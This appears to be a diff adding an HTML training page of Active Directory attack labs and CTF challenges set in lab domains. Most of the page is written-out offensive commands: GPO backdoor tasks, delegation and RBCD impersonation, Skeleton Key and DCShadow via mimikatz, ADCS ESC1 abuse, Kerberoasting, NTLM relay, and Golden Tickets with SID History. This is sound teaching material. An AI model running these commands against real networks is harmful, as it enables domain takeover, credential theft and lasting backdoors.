+.\SharpHound.exe -c Session,LoggedOn --loop --loopduration 02:00:00</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Collect data using both SharpHound and bloodhound-python — compare results.</li>
+              <li>Import data into BloodHound. Run "Shortest Path to Domain Admin" from your user.</li>
+              <li>Identify all Kerberoastable accounts using the pre-built query.</li>
+              <li>Find users with <code>AdminTo</code> relationships to Domain Controllers.</li>
+              <li>Mark your owned principals and re-run shortest paths to see new attack vectors.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: LDAP Enumeration with PowerView</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Perform deep AD enumeration using PowerView to discover users, groups, GPOs, ACLs, and trust relationships.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Import PowerView
+Import-Module .\PowerView.ps1
+
+# Domain and forest enumeration
+Get-Domain
+Get-Forest
+Get-DomainTrust
+Get-ForestTrust
+
+# User enumeration
+Get-DomainUser | Select-Object samaccountname, description, memberof
+Get-DomainUser -AdminCount | Select-Object samaccountname   # privileged accounts
+Get-DomainUser -Properties samaccountname,pwdlastset | Sort-Object pwdlastset
+
+# Group enumeration
+Get-DomainGroup -Identity "Domain Admins" -Recurse
+Get-DomainGroupMember -Identity "Enterprise Admins"
+
+# GPO enumeration
+Get-DomainGPO | Select-Object displayname, gpcfilesyspath
+Get-DomainGPOLocalGroup  # GPOs granting local admin rights
+
+# ACL enumeration
+Find-InterestingDomainAcl -ResolveGUIDs | Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectDN</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find all users with descriptions containing keywords like "pass", "cred", "temp".</li>
+              <li>Enumerate all GPOs and identify any that configure local admin membership.</li>
+              <li>Use <code>Find-InterestingDomainAcl</code> to discover ACL misconfigurations exploitable by your current user.</li>
+              <li>Map all trust relationships and identify if any are bi-directional or transitive.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: SPN and Service Account Enumeration</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Enumerate Service Principal Names to discover service accounts, managed service accounts, and potential Kerberoasting targets.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Method 1: PowerView
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset, lastlogon
+Get-DomainUser -SPN -Properties samaccountname,memberof | ForEach-Object {
+    [PSCustomObject]@{
+        User   = $_.samaccountname
+        SPNs   = ($_.serviceprincipalname -join "; ")
+        Groups = ($_.memberof -join "; ")
+    }
+} | Format-Table -AutoSize
+
+# Method 2: Native LDAP query
+$searcher = [adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))"
+$searcher.FindAll() | ForEach-Object {
+    $_.Properties["samaccountname"][0] + " -> " + ($_.Properties["serviceprincipalname"] -join ", ")
+}
+
+# Method 3: setspn.exe
+setspn -T corp.local -Q */*</code></pre>
+<pre><code class="language-bash"># Method 4: Impacket from Linux
+impacket-GetUserSPNs corp.local/lowpriv:Password123 -dc-ip 10.10.10.10</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enumerate all user-based SPNs — distinguish between user accounts and computer accounts.</li>
+              <li>Identify which Kerberoastable accounts are members of privileged groups.</li>
+              <li>Check password age on SPN accounts — old passwords suggest weak credentials.</li>
+              <li>Test if any SPN accounts have pre-auth disabled (double vulnerability).</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: GPO Abuse</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Identify and exploit Group Policy Object misconfigurations to achieve code execution on domain-joined machines.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Find GPOs where you have modification rights
+Get-DomainGPO | ForEach-Object {
+    $gpoName = $_.displayname
+    $acl = Get-DomainObjectAcl -Identity $_.distinguishedname -ResolveGUIDs
+    $acl | Where-Object {
+        $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite"
+    } | ForEach-Object {
+        [PSCustomObject]@{
+            GPO    = $gpoName
+            Rights = $_.ActiveDirectoryRights
+            Who    = $_.IdentityReferenceName
+        }
+    }
+} | Format-Table -AutoSize
+
+# Step 2: Check which OUs the GPO is linked to
+Get-DomainOU | ForEach-Object {
+    if ($_.gplink -match $gpoGuid) {
+        Write-Host "GPO linked to OU: $($_.distinguishedname)"
+    }
+}
+
+# Step 3: Abuse with SharpGPOAbuse
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" \
+    --Author "NT AUTHORITY\SYSTEM" \
+    --Command "cmd.exe" --Arguments "/c net localgroup Administrators youruser /add" \
+    --GPOName "Vulnerable GPO"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enumerate GPOs and find one where your user has write access.</li>
+              <li>Determine which computers and OUs are affected by this GPO.</li>
+              <li>Use SharpGPOAbuse to add a scheduled task or modify computer startup scripts.</li>
+              <li>Force a Group Policy update: <code>gpupdate /force</code> on a target machine.</li>
+              <li>Verify your payload executed and clean up the GPO modification.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Constrained Delegation Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit constrained delegation (S4U) to impersonate a Domain Admin and access a target service.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Find accounts with constrained delegation
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
+
+# Example output:
+#   svc_web -> {cifs/dc01.corp.local, cifs/dc01}</code></pre>
+<pre><code class="language-bash"># Step 2: Request a TGT for the delegated account
+impacket-getST corp.local/svc_web:WebPass123 \
+    -spn cifs/dc01.corp.local \
+    -impersonate Administrator \
+    -dc-ip 10.10.10.10
+
+# Step 3: Use the ticket
+export KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
+impacket-smbclient -k -no-pass corp.local/Administrator@dc01.corp.local</code></pre>
+<pre><code class="language-powershell"># Alternative: Rubeus S4U
+.\Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH \
+    /impersonateuser:Administrator \
+    /msdsspn:cifs/dc01.corp.local /ptt</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enumerate all accounts with constrained delegation configured.</li>
+              <li>Obtain the password or hash of a delegated account.</li>
+              <li>Use S4U2Self + S4U2Proxy to impersonate Administrator for the allowed SPN.</li>
+              <li>Access the target service with the impersonated ticket.</li>
+              <li>Try changing the target SPN (e.g., cifs → ldap) — does it still work? Why?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Resource-Based Constrained Delegation (RBCD) Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit write access to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute to achieve admin access.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Prerequisite: You have GenericWrite/GenericAll on a computer object
+# OR you have a machine account (MachineAccountQuota > 0)
+
+# Step 1: Create a machine account (if needed)
+Import-Module .\Powermad.ps1
+New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
+
+# Step 2: Set RBCD on the target computer
+$sid = (Get-DomainComputer FAKEMACHINE$).objectsid
+$sd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")
+$bytes = New-Object byte[] ($sd.BinaryLength)
+$sd.GetBinaryForm($bytes, 0)
+Set-DomainObject -Identity TARGET_COMPUTER$ -Set @{'msds-allowedtoactonbehalfofotheridentity' = $bytes}</code></pre>
+<pre><code class="language-bash"># Step 3: Get a ticket using S4U
+impacket-getST corp.local/FAKEMACHINE$:'FakePass123!' \
+    -spn cifs/TARGET_COMPUTER.corp.local \
+    -impersonate Administrator -dc-ip 10.10.10.10
+
+# Step 4: Use the ticket
+export KRB5CCNAME=Administrator@cifs_TARGET_COMPUTER.corp.local@CORP.LOCAL.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@TARGET_COMPUTER.corp.local</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Verify MachineAccountQuota allows you to create a new machine account.</li>
+              <li>Create a machine account and configure RBCD on the target.</li>
+              <li>Use S4U to impersonate Administrator and get a SYSTEM shell on the target.</li>
+              <li>Clean up: remove the RBCD attribute from the target computer.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Diamond Ticket and Skeleton Key</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Forge a Diamond Ticket by modifying a legitimate TGT's PAC, and deploy a Skeleton Key for universal backdoor access.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Diamond Ticket: modify a legitimate TGT (harder to detect than Golden Ticket)
+# Requires the krbtgt AES256 key
+# Step 1: Request a legitimate TGT
+impacket-getTGT corp.local/lowpriv:Password123 -dc-ip 10.10.10.10
+
+# Step 2: Decrypt the TGT, modify the PAC (add DA group SID), re-encrypt
+# Rubeus can do this:
+.\Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:lowpriv /password:Password123 \
+    /enctype:aes256 /domain:corp.local /dc:dc01.corp.local /ptt</code></pre>
+<pre><code class="language-powershell"># Skeleton Key: patch lsass on DC to accept a master password for any account
+# Requires DA/SYSTEM on the DC
+mimikatz.exe "privilege::debug" "misc::skeleton"
+# Now ANY account can authenticate with password "mimikatz"
+# Test:
+net use \\dc01\c$ /user:corp\Administrator mimikatz</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Forge a Diamond Ticket using Rubeus — compare with a standard Golden Ticket.</li>
+              <li>Explain why Diamond Tickets are harder to detect (legitimate encrypted ticket data).</li>
+              <li>Deploy a Skeleton Key on the DC and test authentication with the master password.</li>
+              <li>Discuss detection: how do you detect Skeleton Key (lsass memory modification)?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: DCShadow and Pass-the-Certificate</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use DCShadow to inject rogue data into AD replication, and exploit ADCS (Active Directory Certificate Services) for Pass-the-Certificate attacks.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># DCShadow: Register a rogue DC and push changes via replication
+# Requires DA privileges — one mimikatz instance as SYSTEM, another as DA
+
+# Terminal 1 (SYSTEM): Register rogue DC
+mimikatz.exe "lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512"
+
+# Terminal 2 (DA): Push the replication
+mimikatz.exe "lsadump::dcshadow /push"</code></pre>
+<pre><code class="language-bash"># Pass-the-Certificate: Abuse ADCS misconfigurations
+# Step 1: Find vulnerable certificate templates
+certipy find -u lowpriv@corp.local -p 'Password123' -dc-ip 10.10.10.10 -vulnerable
+
+# Step 2: Request a certificate using a vulnerable template (ESC1)
+certipy req -u lowpriv@corp.local -p 'Password123' -dc-ip 10.10.10.10 \
+    -ca CORP-CA -template VulnTemplate -upn Administrator@corp.local
+
+# Step 3: Authenticate with the certificate
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Use DCShadow to modify a test user's group membership without writing to NTDS.dit directly.</li>
+              <li>Enumerate ADCS with <code>certipy find</code> — identify ESC1-ESC8 vulnerabilities.</li>
+              <li>Exploit ESC1 (misconfigured template) to request a certificate as Administrator.</li>
+              <li>Use the certificate to authenticate and get the NT hash via PKINIT.</li>
+              <li>Discuss detection for both attacks (replication metadata, certificate audit logs).</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- CTF TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Find the Kerberoastable Account</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You have low-privilege domain credentials. Find the Kerberoastable service account, extract its ticket, and crack the password. The flag is the cracked password.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC: 10.10.10.10 (dc01.megacorp.local)
+#   Your creds: jsmith / Welcome1
+#   Domain: megacorp.local
+
+# Start by enumerating SPNs
+impacket-GetUserSPNs megacorp.local/jsmith:Welcome1 -dc-ip 10.10.10.10</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Use <code>GetUserSPNs</code> with <code>-request</code> to dump the TGS ticket.<br>
+            2. The hash format is Kerberos 5 TGS-REP (hashcat mode 13100).<br>
+            3. Try rockyou.txt as your wordlist: <code>hashcat -m 13100 hash.txt rockyou.txt</code><br>
+            4. The cracked password is the flag: <code>FLAG{cracked_password}</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Escalate from User to Domain Admin</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Starting with a standard domain user, find and exploit a misconfiguration chain to reach Domain Admin. The flag is in <code>C:\Users\Administrator\Desktop\flag.txt</code> on the DC.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC: 10.10.10.10 (dc01.corp.local)
+#   Your creds: analyst / Corp2024!
+#   Domain: corp.local
+#
+# Hints in the environment:
+#   - Run BloodHound collection and look for shortest path to DA
+#   - Check for Kerberoastable accounts
+#   - Check for ACL abuse paths
+#   - Check for constrained delegation
+
+# Start with BloodHound collection
+bloodhound-python -u analyst -p 'Corp2024!' -d corp.local -ns 10.10.10.10 -c All</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> BloodHound reveals: analyst → GenericAll on svc_sql (Kerberoastable).<br>
+            <strong>Step 2:</strong> Kerberoast svc_sql and crack the password, or reset it via GenericAll.<br>
+            <strong>Step 3:</strong> svc_sql has constrained delegation to the DC's CIFS service.<br>
+            <strong>Step 4:</strong> Use S4U to impersonate Administrator: <code>impacket-getST corp.local/svc_sql:crackedpass -spn cifs/dc01.corp.local -impersonate Administrator</code><br>
+            <strong>Step 5:</strong> Access the DC and read the flag: <code>impacket-smbclient -k corp.local/Administrator@dc01.corp.local</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Full AD Attack Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Complete compromise of a multi-domain forest. Start with unauthenticated access on the network. The final flag is in the Enterprise Admin's home folder on the forest root DC.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Network: 10.10.10.0/24
+#   Domains: parent.local, child.parent.local
+#   No initial credentials
+#
+# Attack stages:
+#   1. Gain initial creds (LLMNR/NBT-NS poisoning or null sessions)
+#   2. Enumerate and escalate within child domain
+#   3. Compromise child domain → extract trust key
+#   4. Forge inter-realm ticket to escalate to parent domain
+#   5. DCSync the forest root → read the flag
+
+# Stage 1: Responder for initial creds
+sudo responder -I eth0 -dwPv</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Stage 1:</strong> Run Responder to capture NTLMv2 hashes. Crack with hashcat -m 5600.<br>
+            <strong>Stage 2:</strong> Use cracked creds to enumerate child.parent.local. Find an AS-REP roastable account, crack it, and discover it has WriteDACL on the domain.<br>
+            <strong>Stage 3:</strong> Grant yourself DCSync rights on child.parent.local. Dump the krbtgt hash and the inter-realm trust key.<br>
+            <strong>Stage 4:</strong> Forge a Golden Ticket with SID History injection (Enterprise Admins SID from parent domain): <code>mimikatz kerberos::golden /user:Administrator /domain:child.parent.local /sid:CHILD_SID /krbtgt:CHILD_KRBTGT /sids:PARENT_EA_SID /ptt</code><br>
+            <strong>Stage 5:</strong> Access the forest root DC and read the flag from the Enterprise Admin's desktop.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Find the Path to DA</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You have credentials for a help desk user. Use BloodHound to find the shortest attack path to Domain Admin. The flag is the intermediate account you must compromise.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC: 10.10.10.10 (dc01.acme.local)
+#   Your creds: helpdesk / HelpDesk2024!
+#   Domain: acme.local
+#
+# Collect BloodHound data and analyze the graph
+bloodhound-python -u helpdesk -p 'HelpDesk2024!' -d acme.local -ns 10.10.10.10 -c All
+
+# Import into BloodHound → "Shortest Path to Domain Admins from Owned Principals"
+# FLAG{intermediate_account_name}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Mark <code>helpdesk</code> as owned in BloodHound. Run "Shortest Paths to Domain Admins from Owned Principals." The path is: helpdesk → (ForceChangePassword) → svc_backup → (GenericAll) → Domain Admins group. The intermediate account is <code>svc_backup</code>. Reset its password with <code>net rpc password svc_backup -U helpdesk -S dc01.acme.local</code>, then add svc_backup to Domain Admins.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Kerberoast the Hash</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Multiple service accounts exist in the domain. One has a weak password. Kerberoast all SPNs, crack the hashes, and submit the cracked password as the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC: 10.10.10.10 (dc01.widgets.local)
+#   Your creds: intern / Summer2024!
+#   Domain: widgets.local
+#
+impacket-GetUserSPNs widgets.local/intern:'Summer2024!' -dc-ip 10.10.10.10 -request -outputfile krb_hashes.txt
+hashcat -m 13100 krb_hashes.txt /usr/share/wordlists/rockyou.txt
+# FLAG{cracked_password}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>There are 3 SPN accounts. Two use AES256 (slow to crack), one uses RC4 (hashcat mode 13100). The RC4 ticket cracks quickly with rockyou.txt. The password is a common dictionary word with a year appended. After cracking, check the account's group memberships — it may have path to DA.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: ACL Abuse Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Chain multiple ACL misconfigurations across four accounts to escalate from a regular user to Domain Admin. The flag is on the DC at <code>C:\Users\Administrator\Desktop\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC: 10.10.10.10 (dc01.lab.local)
+#   Your creds: webdev / WebDev123!
+#   Domain: lab.local
+#
+# Chain: webdev → ??? → ??? → ??? → Domain Admin
+# Use PowerView or BloodHound to map the chain
+
+bloodhound-python -u webdev -p 'WebDev123!' -d lab.local -ns 10.10.10.10 -c All</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Chain:</strong> webdev → (GenericWrite on svc_hr, set SPN for Kerberoasting) → svc_hr → (WriteDACL on OU=IT, grant yourself GenericAll) → itadmin → (AddMember on Domain Admins) → DA. Key commands: <code>Set-DomainObject -Identity svc_hr -Set @{serviceprincipalname='http/fake'}</code>, then Kerberoast svc_hr. As svc_hr, use WriteDACL to grant GenericAll on itadmin, then reset itadmin's password. As itadmin, add yourself to Domain Admins.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Delegation Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A service account has constrained delegation configured. Exploit S4U to impersonate Administrator on the DC. The flag is at <code>\\dc01\C$\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC: 10.10.10.10 (dc01.internal.local)
+#   Your creds: svc_web / WebService1!
+#   Domain: internal.local
+#   svc_web has: msds-allowedtodelegateto = cifs/dc01.internal.local
+#
+# Exploit constrained delegation to get a ticket as Administrator
+impacket-getST internal.local/svc_web:'WebService1!' \
+    -spn cifs/dc01.internal.local -impersonate Administrator -dc-ip 10.10.10.10</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use S4U2Self to get a forwardable ticket as svc_web, then S4U2Proxy to request a service ticket for cifs/dc01.internal.local impersonating Administrator. <code>export KRB5CCNAME=Administrator@cifs_dc01.internal.local@INTERNAL.LOCAL.ccache</code>, then <code>impacket-smbclient -k -no-pass internal.local/Administrator@dc01.internal.local</code> to read the flag. If S4U fails, check if "Account is sensitive and cannot be delegated" is set on Administrator — try impersonating a different DA.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: NTLM Relay</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">SMB signing is disabled on a server. Capture and relay NTLM authentication to gain access. The flag is in a share on the relay target.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Attacker: 192.168.1.100
+#   Victim (initiates auth): 10.10.10.30
+#   Target (SMB signing disabled): 10.10.10.40
+#
+# Step 1: Verify SMB signing is disabled
+nxc smb 10.10.10.40 --gen-relay-list relay_targets.txt
+
+# Step 2: Start ntlmrelayx targeting the server
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
+
+# Step 3: Trigger authentication (Responder, PrinterBug, PetitPotam)
+python3 PetitPotam.py 192.168.1.100 10.10.10.30</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>impacket-ntlmrelayx</code> with <code>-socks</code> to keep relayed sessions alive. Trigger authentication from the victim machine using PetitPotam (MS-EFSRPC) or PrinterBug (MS-RPRN). The relayed session gives you the victim's access level on the target. Use <code>proxychains smbclient //10.10.10.40/share -U 'corp/admin'</code> through the SOCKS proxy to access shares and read the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Certificate Abuse (ESC1)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Active Directory Certificate Services is deployed with a misconfigured template. Exploit ESC1 to request a certificate as Domain Admin and authenticate. The flag is in the DA's home folder.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   DC/CA: 10.10.10.10 (dc01.secure.local)
+#   Your creds: devuser / Dev2024!
+#   Domain: secure.local
+#   CA Name: SECURE-CA
+#
+# Find vulnerable templates
+certipy find -u devuser@secure.local -p 'Dev2024!' -dc-ip 10.10.10.10 -vulnerable -stdout</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Look for templates with ESC1: (1) Enrollee can specify Subject Alternative Name (SAN), (2) Authenticated Users can enroll, (3) Enables Client Authentication. Request a cert with the DA UPN: <code>certipy req -u devuser@secure.local -p 'Dev2024!' -dc-ip 10.10.10.10 -ca SECURE-CA -template VulnTemplate -upn Administrator@secure.local</code>. Authenticate: <code>certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</code>. This gives you the NT hash via PKINIT.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Trust Relationship Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Escalate from a compromised child domain to the parent domain by forging an inter-realm Golden Ticket with SID History. The flag is on the forest root DC.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Child DC: 10.10.10.20 (dc01.child.forest.local) — fully compromised (DA)
+#   Parent DC: 10.10.10.10 (dc01.forest.local) — target
+#   Child domain SID: S-1-5-21-1111111111-2222222222-3333333333
+#   Parent Enterprise Admins SID: S-1-5-21-4444444444-5555555555-6666666666-519
+#
+# Step 1: DCSync the child domain for krbtgt and trust key
+impacket-secretsdump child.forest.local/Administrator:AdminPass@10.10.10.20 \
+    -just-dc-user krbtgt</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Forge a Golden Ticket with ExtraSIDs including the Enterprise Admins SID from the parent domain: <code>mimikatz "kerberos::golden /user:Administrator /domain:child.forest.local /sid:CHILD_SID /krbtgt:CHILD_KRBTGT_HASH /sids:PARENT_EA_SID /ptt"</code>. The trust between parent and child is bi-directional and transitive, so the parent DC accepts the ticket with the injected SID History. Alternative with Impacket: <code>impacket-ticketer -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain child.forest.local -extra-sid PARENT_EA_SID Administrator</code>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
